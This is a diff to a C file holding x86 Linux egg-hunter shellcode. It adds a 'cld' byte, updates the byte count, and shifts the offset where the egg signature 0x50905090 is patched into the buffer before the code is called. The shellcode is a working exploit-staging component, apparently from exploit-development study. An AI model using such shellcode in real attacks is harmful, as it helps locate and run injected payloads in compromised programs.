@@ -38,7 +38,7 @@
 
  egg_hunter_shellcode
 
- * 39 bytes
+ * 40 bytes
  * null-free if egg signature is
 
 
@@ -66,10 +66,10 @@ unsigned char egghunter[] = \
 
 // Search for the Egg Signature (0x50905090 x 2) - the Egg's 8 first instructions (nop, push eax, nop, push eax...)
 
-"\x31\xf6\xf7\xe6\x66\x81\xca\xff\x0f\x42"
-"\x6a\x21\x58\x8d\x5a\x04\x56\x59\xcd\x80"
-"\x3c\xf2\x74\xec\xb8\x90\x50\x90\x50\x89"
-"\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7";
+"\xfc\x31\xf6\xf7\xe6\x66\x81\xca\xff\x0f"
+"\x42\x6a\x21\x58\x8d\x5a\x04\x56\x59\xcd"
+"\x80\x3c\xf2\x74\xec\xb8\x90\x50\x90\x50"
+"\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7";
 
 main ()
 {
@@ -90,7 +90,7 @@ main ()
 
 	// Setting the egg hunter signature to search (byte reverse order)
 
-		 "movl $0x50905090, (egghunter+25)\n\t"
+		 "movl $0x50905090, (egghunter+26)\n\t"
 
 	// Calling the shellcode
 		 "call egghunter");
